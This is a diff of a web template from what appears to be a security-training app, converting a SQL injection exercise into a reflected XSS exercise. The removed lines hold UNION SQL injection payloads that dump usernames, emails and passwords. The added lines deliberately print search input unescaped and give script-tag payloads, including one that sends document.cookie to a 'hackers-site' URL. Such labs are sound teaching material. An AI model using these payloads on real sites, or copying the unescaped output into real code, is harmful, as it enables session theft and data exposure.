@@ -15,56 +15,44 @@
 
 @section('content')
   <div class="instruction">
-    <p>A SQL Injection attack exploits sites that let users query the database, usually via a form field.
-    The strategy is to intercept the query that gets run in order to add your own query. This can let you view and manipulate data in the database and can lead to disastrous consequences for the site, including exposing user data, altering data, or even deleting data.</p>
+    <p>A strategy that is used to insert JavaScript code on a page. It can be used to redirect a user, display a clone of your site, steal your session information, etc.</p>
+
+    <p><strong>Reflected XSS attack</strong>
+    When a parameter in the URL is displayed on the page. If the site doesn’t escape the params (turn code into special characters), the code is run.</p>
+
+    <p><strong>Stored XSS attack</strong>
+    When user inputted data is stored in the DB. If user input isn’t escaped (before adding to the DB or before displaying it on the page), then any malicious code that was stored in the database will be run. This can affect many users like in a forum setting.</p>
   </div>
 
-  @php
-    //if (isset($found_users)) {
-    //  var_dump($found_users);
-    //}
-  @endphp
-
   <div class="directions">
-    <h2>Exercise Directions</h2>
-    <p>Below you will find a list of directions on a way to control a database by intercepting the query being sent, a.k.a SQL Injection</p>
-    <p>Follow the steps below and if you need it, click on a hint to reveal it</p>
+    <h2>Exercise Directions - Reflected XSS Attack</h2>
+    <p>Search for a user name below</p>
+    <p>The search term you enter will be displayed on the page, along with the search results</p>
   </div>
 
   <div class="exercise-container sql-injection-exercise-container">
     <div class="exercise">
       <h2>Find Users</h2>
-      <form method="post" action="{{action('SqlInjectionController@findUsers')}}">
+      <form method="get" action="{{action('XssAttackController@findUsers')}}">
         <input type="hidden" name="_token" value="{{ csrf_token() }}">
         <div class="form-group">
           <label for="name">Name</label>
-          <input type="text" id="name" name="name" value="{{$old_name or null}}" placeholder="Enter Name">
+          <input type="text" id="name" name="name" value="{{$old_name ?? null}}" placeholder="Enter Name">
         </div>
-        <button type="submit" value="Search" class="button">Search</button>
+        <div class="buttons-container">
+          <input type="submit" class="button" name="search" value="Search" />
+        </div>
       </form>
 
       @if(isset($found_users))
-        <p class="query">
-          <span>
-            Beginning part of query:
-            <code class="large">{{ $found_users_beginning_query }}</code>
-          </span>
+        <h3>Risky user content being displayed</h3>
+        <p>
+          You searched for "{!! $old_name !!}"
+        </p>
 
-          <span>
-            User input of query:
-            <code class="large">{{ $found_users_query_input }}</code>
-          </span>
-
-          <span>
-            End part of query:
-            <code class="large">{{ $found_users_end_query }}</code>
-          </span>
-
-          <span>
-            Database query executed:
-            <code class="large">{{ $found_users_query }}</code>
-          </span>
-
+        <h3>Safe user content being displayed</h3>
+        <p>
+          You searched for "{{ $old_name }}"
         </p>
 
         <h3>Users Found</h3>
@@ -80,33 +68,31 @@
       <h2>Steps</h2>
       <ul>
         <li>
-          <span class="step-title">1. Check if the query is possibly vulnerable to a SQL injection</span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Add a character that could interrupt the SQL statement</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>"</code></span></span>
+          <span class="step-title">1. Make a search and evaluate the URL for any vulnerabilities</span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Does the URL contain any GET parameters?</span></span>
         </li>
         <li>
-          <span class="step-title">2. Find all databases</span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the databases</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.schemata</i> holds the names of all the databases?</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT schema_name AS name FROM information_schema.schemata WHERE "a"="a</code></span></span>
+          <span class="step-title">2. See if the search value is being displayed on the screen</span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>If it is shown on the screen, the page might have a cross-site scripting (XSS vulnerability)</span></span>
         </li>
         <li>
-          <span class="step-title">3. Find all tables on the <i>class</i> database</span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the tables</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.tables</i> holds the names of all the tables from all databases?</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT table_name AS name FROM information_schema.tables WHERE table_schema="class</code></span></span>
+          <span class="step-title">3. Add some JS code into the URL bar to force the page to hopefully run it</span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out where in the URL to add the code</span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>What tags are needed to run JavaScript code?</span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the URL bar: <code>{{url('/')}}/xss-attack?name={{"<script>alert('Yo this site has a XSS vulnerability')</script>"}}</code></span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>You can also just search for: <code>{{"<script>alert('Yo this site has a XSS vulnerability')</script>"}}</code></span></span>
+          <span class="step-hint">Note: <span>Google Chrome may block XSS attacks, so in order to test it, use Firefox</span></span>
         </li>
         <li>
-          <span class="step-title">4. Find all columns on the <i>users</i> table</span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets all the columns in the <i>users</i> table</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that <i>information_schema.columns</i> holds the names of all the columns from all databases?</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT column_name AS name FROM information_schema.columns WHERE table_name="users" AND table_schema="class</code></span></span>
+          <span class="step-title">4. Think about how to run a whole lot of JavaScript without putting too much in the URL</span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Try running an external JS file (it's less obvious)</span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>{{"<script src='" . url('/') . "/js/external-xss.js'></script>"}}</code></span></span>
         </li>
         <li>
-          <span class="step-title">5. Get data from all users on the <i>users</i> table</span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Figure out a way to interrupt the query and add your own that gets values for each user in <i>users</i> table</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Did you know that the <i>concat()</i> method in MySQL will combine columns together?</span></span>
-          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>" UNION SELECT concat(name, " - ", email, ": ", password) AS name FROM class.users WHERE "a"="a</code></span></span>
+          <span class="step-title">5. What else can you do with JavaScript besides popping up an alert?</span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Is there any sensitive data that is stored in JavaScript that I may want to access?</span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>How about the cookies? Redirect the user to another site and send their cookies along for the ride.</span></span>
+          <span class="step-hint hidden">Hint: <small>(Click to reveal)</small><span>Put this in the search field: <code>{{"<script>window.location.replace('" . url('/') . "/hackers-site?cookie=' + document.cookie)</script>"}}</code></span></span>
         </li>
       </ul>
     </div>
